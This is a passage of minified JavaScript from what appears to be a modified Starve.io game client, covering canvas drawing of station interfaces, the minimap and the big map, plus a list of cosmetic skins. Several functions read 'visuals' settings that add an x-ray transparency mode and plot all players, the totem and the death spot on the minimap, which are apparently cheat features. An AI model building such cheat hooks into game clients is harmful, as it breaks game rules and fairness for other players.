        D.drawImage(sprite[Ie.TREE][e][1], m - 650, v - 330);
        D.drawImage(sprite[Ie.TREE][e][4], m - 495, v - 90);
        D.drawImage(sprite[Ie.TREE][e][3], m - 520, v + 340);
        D.drawImage(sprite[Ie.TREE][e][2], m + 830, v - 520);
      }
      sprite[Ie.FIR];
      if (__ && s_) {
        var i = __.cam.x;
        var t = __.cam.y;
        __.cam.x = m;
        __.cam.y = v;
        var r = s_.time;
        s_.time = o_.time;
        var n;
        var a = o_.items;
        a[2].x = 400;
        a[2].y = 100;
        a[2].draw(Ie.WORKBENCH);
        (n = a[1]).x = -500;
        n.y = 100;
        n.fruits[0].x = n.x - 20.5;
        n.fruits[0].y = n.y - 22.5;
        n.fruits[1].x = n.x - 35.5;
        n.fruits[1].y = n.y + 7.5;
        n.fruits[2].x = n.x + 7.5;
        n.fruits[2].y = n.y - 30;
        n.fruits[3].x = n.x + 22.5;
        n.fruits[3].y = n.y;
        n.fruits[4].x = n.x - 7.5;
        n.fruits[4].y = n.y + 14.5;
        for (var o = 0; o < n.info; o++) {
          n.fruits[o].draw(Ie.FRUIT);
        }
        (n = a[3]).x = 210;
        n.y = -290;
        n.fruits[0].x = n.x - 20.5;
        n.fruits[0].y = n.y - 22.5;
        n.fruits[1].x = n.x - 35.5;
        n.fruits[1].y = n.y + 7.5;
        n.fruits[2].x = n.x + 7.5;
        n.fruits[2].y = n.y - 30;
        n.fruits[3].x = n.x + 22.5;
        n.fruits[3].y = n.y;
        n.fruits[4].x = n.x - 7.5;
        n.fruits[4].y = n.y + 14.5;
        for (o = 0; o < n.info; o++) {
          n.fruits[o].draw(Ie.FRUIT);
        }
        __.cam.x = i;
        __.cam.y = t;
        s_.time = r;
      }
    }
    function Nn(e, i, t, n, a, o, s, _, E, T) {
      if (!(i.tryLoad !== undefined && i.tryLoad() !== 1)) {
        if (r.visuals.xray.all) {
          e.globalAlpha = r.visuals.xray.opacity;
        }
        if (T !== undefined) {
          e.drawImage(i, t, n, Math.max(1, a), Math.max(1, o), s, _, E, T);
        } else if (o !== undefined) {
          e.drawImage(i, t, n, a, o);
        } else {
          e.drawImage(i, t, n);
        }
      }
    }
    function bn() {
      var e = T_.info_box;
      var i = e.id;
      if (e.activated === 1 && e.display === 1) {
        if (INFO_BOX[i] === undefined) {
          INFO_BOX[i] = function (e) {
            var i = document.createElement("canvas");
            var t = i.getContext("2d");
            var r = ve[e];
            t.font = "20px Baloo Paaji";
            var n = 0;
            if (r.length >= 1) {
              n = Math.max(0, t.measureText(r[0]).width);
            }
            t.font = "17px Baloo Paaji";
            if (r.length >= 2) {
              n = Math.max(n, t.measureText(r[1]).width);
            }
            t.font = "14px Baloo Paaji";
            Me = 2;
            for (; Me < r.length; Me++) {
              n = Math.max(n, t.measureText(r[Me]).width);
            }
            var a = n + 35;
            var o = 0;
            o = r.length === 1 ? 55 : r.length === 2 ? 85 : (r.length - 2) * 26 + 85;
            i.width = a;
            i.height = o;
            Be(t, 0, 0, a, o, 10);
            t.fillStyle = "#000000";
            t.globalAlpha = 0.5;
            t.fill();
            if (r.length >= 1) {
              t.textBaseline = "middle";
              t.font = "20px Baloo Paaji";
              t.globalAlpha = 1;
              t.fillStyle = "#e2c340";
              t.fillText(r[0], 15, 28);
            }
            if (r.length >= 2) {
              t.font = "17px Baloo Paaji";
              t.fillStyle = "#ffffff";
              t.fillText(r[1], 15, 55);
              o = 55;
            }
            if (r.length >= 3) {
              t.font = "14px Baloo Paaji";
              t.globalAlpha = 0.7;
              Me = 2;
              t.font = "14px Baloo Paaji";
              t.globalAlpha = 0.7;
              Me = 2;
              for (; Me < r.length; Me++) {
                t.fillText(r[Me], 15, o + 28);
                o += 26;
              }
            }
            return i;
          }(i);
        }
        if (e.craft === 1) {
          Nn(D, INFO_BOX[i], e.x, e.y);
        } else if (e.x - 80 + INFO_BOX[i].width > S) {
          Nn(D, INFO_BOX[i], S - INFO_BOX[i].width - 10, e.y - INFO_BOX[i].height - 10);
        } else {
          Nn(D, INFO_BOX[i], e.x - 80, e.y - INFO_BOX[i].height - 10);
        }
      }
    }
    function Dn(e, i, t) {
      var r = sprite[Ie.SLOT_NUMBER][e];
      var n = i.info.translate.x + L * 5;
      var a = i.info.translate.y + L * 5;
      if (i.info.state == es || t) {
        a += L * 5;
      }
      Nn(D, r, n, a);
    }
    function Sn(e, i) {
      if (!sprite[Ie.COUNTER][e]) {
        sprite[Ie.COUNTER][e] = Zi(L, "x" + e, 17, "#FFF");
      }
      var t = sprite[Ie.COUNTER][e];
      var r = i.info.translate.x + i.info.img[0].width - t.width - L * 14;
      var n = i.info.translate.y + i.info.img[0].height - t.height - L * 19;
      if (i.info.state == es) {
        n += L * 5;
      }
      Nn(D, t, r, n);
    }
    function pn() {
      if (!(__.chest.open || __.furnace.open || __.windmill.open || __.bread_oven.open || __.extractor.open)) {
        __.sign.open = false;
        var e = s_.fast_units[__.uid];
        var i = ds.DIST_SIGN;
        if (e) {
          for (var t = 0; t < s_.units[us.SIGN].length; t++) {
            var r = s_.units[us.SIGN][t];
            var n = Utils.dist(r, e);
            if (n < i && r.info === 0 && r.pid === __.id) {
              __.sign.open = true;
              i = n;
              __.sign.iid = r.id;
            }
          }
          if (i < ds.DIST_SIGN) {
            T_.sign.button.draw(D);
          }
        }
      }
    }
    function mn() {
      if (!(__.chest.open || __.furnace.open || __.windmill.open || __.extractor.open)) {
        __.bread_oven.open = false;
        var e = s_.fast_units[__.uid];
        var i = ds.DIST_BREAD_OVEN;
        if (e) {
          for (var t = 0; t < s_.units[us.BREAD_OVEN].length; t++) {
            var r = s_.units[us.BREAD_OVEN][t];
            var n = Utils.dist(r, e);
            if (n < i) {
              i = n;
              __.bread_oven.open = true;
              __.bread_oven.amount_wood = r.info & 31;
              __.bread_oven.amount_flour = (r.info & 992) >> 5;
              __.bread_oven.amount_bread = (r.info & 31744) >> 10;
              __.bread_oven.pid = r.pid;
              __.bread_oven.iid = r.id;
            }
          }
          if (i < ds.DIST_BREAD_OVEN) {
            var a = sprite[Ie.BREAD_OVEN_UI];
            var o = (s = T_.bread_oven_wood_button).info.translate.x - 32;
            Nn(D, a, o, 0);
            if (__.bread_oven.amount_wood > 0) {
              s.draw(D);
              if ((_ = __.bread_oven.amount_wood) > 1) {
                Sn(_, s);
              }
            }
            var s = T_.bread_oven_bread_button;
            if (__.bread_oven.amount_bread > 0) {
              s.draw(D);
              if ((_ = __.bread_oven.amount_bread) > 1) {
                Sn(_, s);
              }
            }
            var _;
            s = T_.bread_oven_flour_button;
            if (__.bread_oven.amount_flour > 0) {
              s.draw(D);
              if ((_ = __.bread_oven.amount_flour) > 1) {
                Sn(_, s);
              }
            }
          }
        }
      }
    }
    function vn() {
      if (!__.chest.open && !__.furnace.open) {
        __.extractor.open = false;
        var e = s_.fast_units[__.uid];
        var i = ds.DIST_EXTRACTOR_MACHINE;
        if (e) {
          for (var t = 0; t < ls.length; t++) {
            for (var r = ls[t][0], n = ls[t][1], a = 0; a < s_.units[r].length; a++) {
              var o = s_.units[r][a];
              var s = Utils.dist(o, e);
              if (s < i) {
                i = s;
                __.extractor.mineral = n;
                __.extractor.type = r;
                __.extractor.open = true;
                __.extractor.amount_wood = o.info & 255;
                __.extractor.amount_mineral = (o.info & 65280) >> 8;
                __.extractor.pid = o.pid;
                __.extractor.iid = o.id;
              }
            }
          }
          if (i < ds.DIST_EXTRACTOR_MACHINE) {
            var _;
            var E = sprite[Ie.EXTRACTOR_CASES];
            var T = (A = T_.extractor_wood_button).info.translate.x - 33;
            Nn(D, E, T, 0);
            if (__.extractor.amount_wood > 0) {
              A.draw(D);
              if ((_ = __.extractor.amount_wood) > 1) {
                Sn(_, A);
              }
            }
            switch (__.extractor.mineral) {
              case le.STONE:
                var A = T_.extractor_stone_button;
                break;
              case le.GOLD:
                A = T_.extractor_gold_button;
                break;
              case le.DIAMOND:
                A = T_.extractor_diamond_button;
                break;
              case le.AMETHYST:
                A = T_.extractor_amethyst_button;
                break;
              case le.REIDITE:
                A = T_.extractor_reidite_button;
            }
            if (__.extractor.amount_mineral > 0) {
              A.draw(D);
              if ((_ = __.extractor.amount_mineral) > 1) {
                Sn(_, A);
              }
            }
          }
        }
      }
    }
    function Mn() {
      if (!__.chest.open && !__.furnace.open) {
        __.windmill.open = false;
        var e = s_.fast_units[__.uid];
        var i = ds.DIST_WINDMILL;
        if (e) {
          for (var t = 0; t < s_.units[us.WINDMILL].length; t++) {
            var r = s_.units[us.WINDMILL][t];
            var n = Utils.dist(r, e);
            if (n < i) {
              i = n;
              __.windmill.open = true;
              __.windmill.amount_wheat = r.info & 255;
              __.windmill.amount_flour = (r.info & 65280) >> 8;
              __.windmill.pid = r.pid;
              __.windmill.iid = r.id;
            }
          }
          if (i < ds.DIST_WINDMILL) {
            var a = sprite[Ie.WINDMILL_CASES];
            var o = (_ = T_.windmill_wheat_button).info.translate.x - 33;
            Nn(D, a, o, 0);
            if (__.windmill.amount_wheat > 0) {
              _.draw(D);
              if ((s = __.windmill.amount_wheat) > 1) {
                Sn(s, _);
              }
            }
            var s;
            var _ = T_.windmill_flour_button;
            if (__.windmill.amount_flour > 0) {
              _.draw(D);
              if ((s = __.windmill.amount_flour) > 1) {
                Sn(s, _);
              }
            }
          }
        }
      }
    }
    function Ln() {
      if (!__.chest.open) {
        __.furnace.amount = 0;
        __.furnace.open = false;
        var e = s_.fast_units[__.uid];
        var i = ds.DIST_FURNACE;
        if (e) {
          for (var t = 0; t < s_.units[us.FURNACE].length; t++) {
            var r = s_.units[us.FURNACE][t];
            var n = Utils.dist(r, e);
            if (n < i) {
              i = n;
              __.furnace.open = true;
              __.furnace.amount = r.info;
              __.furnace.pid = r.pid;
              __.furnace.iid = r.id;
            }
          }
          if (i < ds.DIST_FURNACE) {
            var a = sprite[Ie.FURNACE_SLOT];
            var o = T_.furnace_button;
            var s = Math.floor(o.info.translate.x + (o.info.img[0].width - a.width) / 2);
            var _ = Math.floor(o.info.translate.y + (o.info.img[0].height - a.height) / 2) + 3;
            Nn(D, a, s, _);
            if (__.furnace.amount > 0) {
              o.draw(D);
              var E = __.furnace.amount;
              if (E > 1) {
                Sn(E, o);
              }
            }
          }
        }
      }
    }
    function Gn() {
      __.resurrection.open = false;
      var e = s_.fast_units[__.uid];
      var i = ds.DIST_RESURRECTION;
      if (e) {
        for (var t = 0; t < s_.units[us.RESURRECTION].length; t++) {
          var r = s_.units[us.RESURRECTION][t];
          var n = Utils.dist(r, e);
          if (n < i) {
            i = n;
            __.resurrection.open = true;
            __.resurrection.pid = r.pid;
            __.resurrection.iid = r.id;
          }
        }
        if (i < ds.DIST_RESURRECTION) {
          T_.resurrection.draw(D);
        }
      }
    }
    function fn() {
      __.totem.id = -1;
      __.totem.pid = -1;
      if (!(__.spectator || __.totem.wait || __.zombie)) {
        var e = s_.fast_units[__.uid];
        var i = ds.DIST_TOTEM;
        if (e) {
          for (var t = 0; t < s_.units[us.TOTEM].length; t++) {
            var r = s_.units[us.TOTEM][t];
            var n = Utils.dist(r, e);
            if (n < i) {
              i = n;
              __.totem.id = r.id;
              __.totem.pid = r.pid;
              __.totem.info = r.info;
              __.totem.lock = (r.info & 16) >> 4;
            }
          }
        }
        var a = T_.team_buttons_id;
        T_.team_buttons_id = -1;
        if (__.totem.pid == -1 || __.team.length != 0 && __.id != __.totem.pid) {
          if (__.team.length != 0 && __.team[0] != __.id) {
            T_.team_buttons_id = As.TEAM_LEAVE;
          } else if (__.team.length != 0 && __.team[0] == __.id) {
            T_.team_buttons_id = As.TEAM_SHOW;
          } else if (__.team.length != 0) {
            T_.team_buttons_id = As.TEAM_JOIN;
          }
        } else if (__.team.length == 0 && __.totem.info >= 8) {
          T_.team_buttons_id = As.TEAM_FULL;
        } else if (__.team.length == 0) {
          T_.team_buttons_id = As.TEAM_JOIN;
        } else {
          T_.team_buttons_id = As.TEAM_MANAGE;
        }
        if (T_.team_buttons_id != -1) {
          T_.team_buttons[T_.team_buttons_id].button.draw(D);
        }
        var o = document.getElementById("team_box").style;
        if (T_.team_buttons_id != -1 && T_.team_buttons_id != a && o.display == "inline-block") {
          T_.team_buttons[T_.team_buttons_id].action();
        }
      }
    }
    function Hn() {
      __.chest.id = -1;
      __.chest.lock = false;
      __.chest.locked = false;
      __.chest.lockpick = false;
      __.chest.padlock = false;
      __.chest.open = false;
      var e = s_.fast_units[__.uid];
      var i = ds.DIST_CHEST;
      if (e) {
        for (var t = 0; t < s_.units[us.CHEST].length; t++) {
          var r = s_.units[us.CHEST][t];
          var n = Utils.dist(r, e);
          if (n < i) {
            i = n;
            __.chest.open = true;
            __.chest.id = r.action < 2 ? -1 : Math.floor((r.action - 1) / 2);
            __.chest.amount = r.info;
            __.chest.pid = r.pid;
            __.chest.iid = r.id;
            __.chest.locked = r.lock;
            __.chest.lock = !(!r.lock || __.id == r.pid || __.in_team(r.pid));
            __.chest.padlock = r.pid === __.id && !__.chest.locked && __.inv.find_item(le.LOCK) != -1;
            if (__.chest.locked && __.inv.find_item(le.LOCKPICK) != -1) {
              __.chest.lockpick = true;
            }
          }
        }
        if (i < ds.DIST_CHEST) {
          var a = sprite[Ie.CHEST_SLOT];
          var o = T_.chest_buttons[0];
          var s = Math.floor(o.info.translate.x + (o.info.img[0].width - a.width) / 2);
          var _ = Math.floor(o.info.translate.y + (o.info.img[0].height - a.height) / 2) + 3;
          Nn(D, a, s, _);
          if ((!__.chest.lock || __.chest.pid === __.id) && __.chest.id >= 0) {
            (o = T_.chest_buttons[__.chest.id]).draw(D);
            var E = __.chest.amount;
            if (E > 1) {
              Sn(E, o);
            }
          }
          if (__.chest.lock) {
            T_.chest_locked.draw(D);
          } else if (__.chest.padlock) {
            T_.chest_padlock.draw(D);
          }
          if (__.chest.lockpick) {
            T_.chest_lockpick.draw(D);
          }
        }
      }
    }
    function Pn() {
      if (__.bigmap) {
        D.globalAlpha = 0.5;
        D.fillStyle = "#000";
        D.fillRect(0, 0, S, p);
        D.globalAlpha = 0.8;
        var e = sprite[Ie.BIGMAP][s_.time];
        var i = m - e.width / 2;
        var t = v - e.height / 2;
        Nn(D, e, i, t);
        D.globalAlpha = 1;
        if (T_.minimap.marker.x > -1) {
          D.fillStyle = "#660000";
          ze(D, i + T_.minimap.marker.x * 3 * L, t + T_.minimap.marker.y * 3 * L, L * 14);
          D.fill();
        }
        for (var r = T_.minimap.players, n = 0; n < r.length; n++) {
          var a = r[n];
          D.fillStyle = (s_.time, "#ff0000");
          ze(D, i + a.x / (s_.nw * 100) * 600 * L, t + a.y / (s_.nh * 100) * 600 * L, L * 6);
          D.fill();
        }
        var o = s_.fast_units[__.uid];
        if (o) {
          D.fillStyle = s_.time ? "#fff" : "#e39716";
          ze(D, i + o.x / (s_.nw * 100) * 600 * L, t + o.y / (s_.nh * 100) * 600 * L, L * 12);
          D.fill();
        }
      }
    }
    function yn() {
      if (__.reconnect.enabled) {
        D.globalAlpha = 0.9;
        D.fillStyle = "#000";
        Be(D, m - 150, v - 90, 300, 180, 15);
        D.fill();
        D.globalAlpha = 1;
        var e = sprite[Ie.GEAR2];
        D.save();
        __.reconnect.rotate = (__.reconnect.rotate + I_ * 2) % (Math.PI * 2);
        D.translate(S / 2, p / 2 - 25);
        D.rotate(__.reconnect.rotate);
        Nn(D, e, -e.width / 2, -e.height / 2);
        D.restore();
        e = sprite[Ie.RECONNECT];
        Nn(D, e, (S - e.width) / 2, (p - e.height) / 2 + 25);
      }
    }
    function Bn() {
      if (__.inv.can_select.length > 0) {
        var e = {
          x: T_.minimap.translate.x,
          y: T_.minimap.translate.y - L * 120
        };
      } else {
        e = {
          x: T_.minimap.translate.x,
          y: T_.minimap.translate.y - L * 50
        };
      }
      D.globalAlpha = 0.8;
      var i = sprite[Ie.MINIMAP][s_.time];
      Nn(D, i, e.x, e.y);
      D.globalAlpha = 1;
      if (T_.minimap.marker.x > -1) {
        D.fillStyle = "#660000";
        ze(D, e.x + T_.minimap.marker.x * L, e.y + T_.minimap.marker.y * L, L * 5);
        D.fill();
      }
      for (var t = L, n = T_.minimap.players, a = 0; a < n.length; a++) {
        var o = n[a];
        D.fillStyle = (s_.time, "#ff0000");
        ze(D, e.x + o.x / (s_.nw * 100) * 193 * L, e.y + o.y / (s_.nh * 100) * 193 * L, L * 2);
        D.fill();
      }
      n = s_.units[us.PLAYERS];
      if (r.visuals.map.totem.enable) {
        let i = r.visuals.map.totem.x;
        let t = r.visuals.map.totem.y;
        if (i !== -1 && t !== -1) {
          D.save();
          D.fillStyle = "black";
          ze(D, e.x + i / (s_.nw * 100) * 193 * L, e.y + t / (s_.nh * 100) * 193 * L, L * 4);
          D.fill();
          D.restore();
        }
      }
      if (r.visuals.map.death.enable) {
        let i = r.visuals.map.death.x;
        let t = r.visuals.map.death.y;
        if (i !== -1 && t !== -1) {
          D.save();
          D.fillStyle = "#E32636";
          ze(D, e.x + i / (s_.nw * 100) * 193 * L, e.y + t / (s_.nh * 100) * 193 * L, L * 4);
          D.fill();
          D.restore();
        }
      }
      if (r.visuals.map.players) {
        n.forEach(i => {
          D.save();
          D.fillStyle = __.id === i.pid ? s_.time ? "#fff" : "#e39716" : "red";
          ze(D, e.x + i.x / (s_.nw * 100) * 193 * L, e.y + i.y / (s_.nh * 100) * 193 * L, L * 4);
          D.fill();
          D.restore();
        });
      }
      L = t;
    }
    render_minimap = function () {
      for (var e = 0; e < 2; e++) {
        sprite[Ie.MINIMAP_CTX][e].clearRect(0, 0, 193, 193);
        sprite[Ie.MINIMAP_CTX][e].drawImage(MINIMAP_UTILS.MAP[e], 0, 0, 193, 193);
        sprite[Ie.BIGMAP_CTX][e].clearRect(0, 0, 600, 600);
        sprite[Ie.BIGMAP_CTX][e].drawImage(MINIMAP_UTILS.MAP[e], 0, 0, 600, 600);
        for (var i = s_.biomes.length - 1; i >= 0; i--) {
          var t = s_.biomes[i];
          var r = t.x1 * 193 / (s_.nw * 100);
          var n = t.y1 * 193 / (s_.nh * 100);
          var a = t.w * 193 / (s_.nw * 100);
          var o = t.h * 193 / (s_.nh * 100);
          var s = t.x1 * 600 / (s_.nw * 100);
          var _ = t.y1 * 600 / (s_.nh * 100);
          var E = t.w * 600 / (s_.nw * 100);
          var T = t.h * 600 / (s_.nh * 100);
          if (t.t === s_.BIOME_FOREST) {
            sprite[Ie.MINIMAP_CTX][e].drawImage(MINIMAP_UTILS.FOREST[e], r, n, a, o);
            sprite[Ie.BIGMAP_CTX][e].drawImage(MINIMAP_UTILS.FOREST[e], s, _, E, T);
          }
          if (t.t === s_.BIOME_WINTER) {
            sprite[Ie.MINIMAP_CTX][e].drawImage(MINIMAP_UTILS.WINTER[e], r, n, a, o);
            sprite[Ie.BIGMAP_CTX][e].drawImage(MINIMAP_UTILS.WINTER[e], s, _, E, T);
          }
          if (t.t === s_.BIOME_LAVA) {
            sprite[Ie.MINIMAP_CTX][e].drawImage(MINIMAP_UTILS.LAVA[e], r, n, a, o);
            sprite[Ie.BIGMAP_CTX][e].drawImage(MINIMAP_UTILS.LAVA[e], s, _, E, T);
          }
          if (t.t === s_.BIOME_DRAGON) {
            sprite[Ie.MINIMAP_CTX][e].drawImage(MINIMAP_UTILS.CAVE[e], r, n, a, o);
            sprite[Ie.BIGMAP_CTX][e].drawImage(MINIMAP_UTILS.CAVE[e], s, _, E, T);
          }
          if (t.t === s_.BIOME_DESERT) {
            sprite[Ie.MINIMAP_CTX][e].drawImage(MINIMAP_UTILS.DESERT[e], r, n, a, o);
            sprite[Ie.BIGMAP_CTX][e].drawImage(MINIMAP_UTILS.DESERT[e], s, _, E, T);
          }
        }
      }
    };
    render_cosmetics = function () {
      COSMETICS = {
        SKIN: [{
          id: 0,
          day: IMAGES.PLAYER0D,
          night: IMAGES.PLAYER0N,
          dayHand: IMAGES.HAND0D,
          nightHand: IMAGES.HAND0N,
          rarity: RARITY.FREE,
          author: "Starve.io",
          name: "Starver"
        }, {
          id: 3,
          day: IMAGES.PLAYER3D,
          night: IMAGES.PLAYER3N,
          dayHand: IMAGES.HAND3D,
          nightHand: IMAGES.HAND3N,
          rarity: RARITY.FREE,
          author: "Starve.io",
          name: "Angry"
        }, {
          id: 2,
          day: IMAGES.PLAYER2D,
          night: IMAGES.PLAYER2N,
          dayHand: IMAGES.HAND2D,
          nightHand: IMAGES.HAND2N,
          rarity: RARITY.FREE,
          author: "Starve.io",
          name: "Sad"
        }, {
          id: 9,
          day: IMAGES.PLAYER9D,
          night: IMAGES.PLAYER9N,
          dayHand: IMAGES.HAND9D,
          nightHand: IMAGES.HAND9N,
          rarity: RARITY.FREE,
          author: "Starve.io",
          name: "Happy 1"
        }, {
          id: 1,
          day: IMAGES.PLAYER1D,
          night: IMAGES.PLAYER1N,
          dayHand: IMAGES.HAND1D,
          nightHand: IMAGES.HAND1N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "What?"
        }, {
          id: 4,
          day: IMAGES.PLAYER4D,
          night: IMAGES.PLAYER4N,
          dayHand: IMAGES.HAND4D,
          nightHand: IMAGES.HAND4N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Suspicious"
        }, {
          id: 5,
          day: IMAGES.PLAYER5D,
          night: IMAGES.PLAYER5N,
          dayHand: IMAGES.HAND5D,
          nightHand: IMAGES.HAND5N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Scar"
        }, {
          id: 6,
          day: IMAGES.PLAYER6D,
          night: IMAGES.PLAYER6N,
          dayHand: IMAGES.HAND6D,
          nightHand: IMAGES.HAND6N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "In Trouble"
        }, {
          id: 7,
          day: IMAGES.PLAYER7D,
          night: IMAGES.PLAYER7N,
          dayHand: IMAGES.HAND7D,
          nightHand: IMAGES.HAND7N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Cute"
        }, {
          id: 8,
          day: IMAGES.PLAYER8D,
          night: IMAGES.PLAYER8N,
          dayHand: IMAGES.HAND8D,
          nightHand: IMAGES.HAND8N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Bored 1"
        }, {
          id: 10,
          day: IMAGES.PLAYER10D,
          night: IMAGES.PLAYER10N,
          dayHand: IMAGES.HAND10D,
          nightHand: IMAGES.HAND10N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Happy 2"
        }, {
          id: 11,
          day: IMAGES.PLAYER11D,
          night: IMAGES.PLAYER11N,
          dayHand: IMAGES.HAND11D,
          nightHand: IMAGES.HAND11N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Crazy"
        }, {
          id: 12,
          day: IMAGES.PLAYER12D,
          night: IMAGES.PLAYER12N,
          dayHand: IMAGES.HAND12D,
          nightHand: IMAGES.HAND12N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Happy 3"
        }, {
          id: 13,
          day: IMAGES.PLAYER13D,
          night: IMAGES.PLAYER13N,
          dayHand: IMAGES.HAND13D,
          nightHand: IMAGES.HAND13N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Very Cute"
        }, {
          id: 14,
          day: IMAGES.PLAYER14D,
          night: IMAGES.PLAYER14N,
          dayHand: IMAGES.HAND14D,
          nightHand: IMAGES.HAND14N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Curious"
        }, {
          id: 15,
          day: IMAGES.PLAYER15D,
          night: IMAGES.PLAYER15N,
          dayHand: IMAGES.HAND15D,
          nightHand: IMAGES.HAND15N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Bored 2"
        }, {
          id: 16,
          day: IMAGES.PLAYER16D,
          night: IMAGES.PLAYER16N,
          dayHand: IMAGES.HAND16D,
          nightHand: IMAGES.HAND16N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Happy 4"
        }, {
          id: 17,
          day: IMAGES.PLAYER17D,
          night: IMAGES.PLAYER17N,
          dayHand: IMAGES.HAND17D,
          nightHand: IMAGES.HAND17N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Scar 2"
        }, {
          id: 18,
          day: IMAGES.PLAYER18D,
          night: IMAGES.PLAYER18N,
          dayHand: IMAGES.HAND18D,
          nightHand: IMAGES.HAND18N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Sick"
        }, {
          id: 19,
          day: IMAGES.PLAYER19D,
          night: IMAGES.PLAYER19N,
          dayHand: IMAGES.HAND19D,
          nightHand: IMAGES.HAND19N,
          rarity: RARITY.WOOD,
          author: "Starve.io",
          name: "Somnambule"
        }, {
          id: 24,
          day: IMAGES.SKIN7D,
          night: IMAGES.SKIN7N,
          dayHand: IMAGES.HAND_SKIN7D,
          nightHand: IMAGES.HAND_SKIN7N,
          rarity: RARITY.WOOD,
          author: "Pixelbitie",
          name: "Feel Bad"
        }, {
          id: 23,
          day: IMAGES.SKIN0D,
          night: IMAGES.SKIN0N,
          dayHand: IMAGES.HAND_SKIN0D,
          nightHand: IMAGES.HAND_SKIN0N,
          rarity: RARITY.WOOD,
          author: "Pixelbitie",
          name: "Mmmh."
        }, {
          id: 103,
          day: IMAGES.SKIN78D,
          night: IMAGES.SKIN78N,
          dayHand: IMAGES.HAND_SKIN78D,
          nightHand: IMAGES.HAND_SKIN78N,
          rarity: RARITY.WOOD,
          author: "pizza wa",
          name: "Panic"
        }, {
          id: 105,
          day: IMAGES.SKIN80D,
          night: IMAGES.SKIN80N,
          dayHand: IMAGES.HAND_SKIN80D,
          nightHand: IMAGES.HAND_SKIN80N,
          rarity: RARITY.WOOD,
          author: "pizza wa",
          name: "Hypnotic"
        }, {
          id: 106,
          day: IMAGES.SKIN81D,
          night: IMAGES.SKIN81N,
          dayHand: IMAGES.HAND_SKIN81D,
          nightHand: IMAGES.HAND_SKIN81N,
          rarity: RARITY.WOOD,
          author: "pizza wa",
          name: "Stars in the eyes"
        }, {
          id: 104,
          day: IMAGES.SKIN79D,
          night: IMAGES.SKIN79N,
          dayHand: IMAGES.HAND_SKIN79D,
          nightHand: IMAGES.HAND_SKIN79N,
          rarity: RARITY.STONE,
          author: "pizza wa",
          name: "Scared at night"
        }, {
          id: 20,
          day: IMAGES.SKIN_VAMPIRED,
          night: IMAGES.SKIN_VAMPIREN,
          dayHand: IMAGES.HAND_VAMPIRED,
          nightHand: IMAGES.HAND_VAMPIREN,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Vampire"
        }, {
          id: 21,
          day: IMAGES.SKIN_ZOMBIED,
          night: IMAGES.SKIN_ZOMBIEN,
          dayHand: IMAGES.HAND_ZOMBIED,
          nightHand: IMAGES.HAND_ZOMBIEN,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Zombie"
        }, {
          id: 22,
          day: IMAGES.SKIN_DEVASTD,
          night: IMAGES.SKIN_DEVASTN,
          dayHand: IMAGES.HAND_DEVASTD,
          nightHand: IMAGES.HAND_DEVASTN,
          rarity: RARITY.STONE,
          author: "Pixelbitie",
          name: "Devaster"
        }, {
          id: 116,
          day: IMAGES.SKIN91D,
          night: IMAGES.SKIN91N,
          dayHand: IMAGES.HAND_SKIN91D,
          nightHand: IMAGES.HAND_SKIN91N,
          rarity: RARITY.STONE,
          author: "Fukss",
          name: "Dead Devaster"
        }, {
          id: 27,
          day: IMAGES.SKIN19D,
          night: IMAGES.SKIN19N,
          dayHand: IMAGES.HAND_SKIN19D,
          nightHand: IMAGES.HAND_SKIN19N,
          rarity: RARITY.STONE,
          author: "Winter",
          name: "Cactus"
        }, {
          id: 28,
          day: IMAGES.SKIN20D,
          night: IMAGES.SKIN20N,
          dayHand: IMAGES.HAND_SKIN20D,
          nightHand: IMAGES.HAND_SKIN20N,
          rarity: RARITY.STONE,
          author: "pizza wa",
          name: "Bee"
        }, {
          id: 49,
          day: IMAGES.SKIN24D,
          night: IMAGES.SKIN24N,
          dayHand: IMAGES.HAND_SKIN24D,
          nightHand: IMAGES.HAND_SKIN24N,
          rarity: RARITY.STONE,
          author: "Taco4Life",
          name: "Camo Skin"
        }, {
          id: 58,
          day: IMAGES.SKIN34D,
          night: IMAGES.SKIN34N,
          dayHand: IMAGES.HAND_SKIN34D,
          nightHand: IMAGES.HAND_SKIN34N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Blue Limax Skin"
        }, {
          id: 59,
          day: IMAGES.SKIN33D,
          night: IMAGES.SKIN33N,
          dayHand: IMAGES.HAND_SKIN33D,
          nightHand: IMAGES.HAND_SKIN33N,
          rarity: RARITY.STONE,
          author: "Starve.io",
          name: "Red Limax Skin"
        }, {
          id: 94,
          day: IMAGES.SKIN69D,
          night: IMAGES.SKIN69N,
          dayHand: IMAGES.HAND_SKIN69D,
          nightHand: IMAGES.HAND_SKIN69N,
          rarity: RARITY.STONE,
          author: "Taco4Life",
          name: "Mr. Pumpkin"
        }, {
          id: 109,
          day: IMAGES.SKIN84D,
          night: IMAGES.SKIN84N,
          dayHand: IMAGES.HAND_SKIN84D,
          nightHand: IMAGES.HAND_SKIN84N,
          rarity: RARITY.STONE,
          author: "pizza wa",
          name: "Wood"
        }, {
          id: 114,
          day: IMAGES.SKIN89D,
          night: IMAGES.SKIN89N,
          dayHand: IMAGES.HAND_SKIN89D,
          nightHand: IMAGES.HAND_SKIN89N,
          rarity: RARITY.STONE,
          author: "pizza wa",
          name: "Zebra"
        }, {
          id: 120,
          day: IMAGES.SKIN95D,
          night: IMAGES.SKIN95N,
          dayHand: IMAGES.HAND_SKIN95D,
          nightHand: IMAGES.HAND_SKIN95N,
          rarity: RARITY.STONE,
          author: "CrysTal",
          name: "Tiger"
        }, {
          id: 134,
          day: IMAGES.SKIN109D,
          night: IMAGES.SKIN109N,
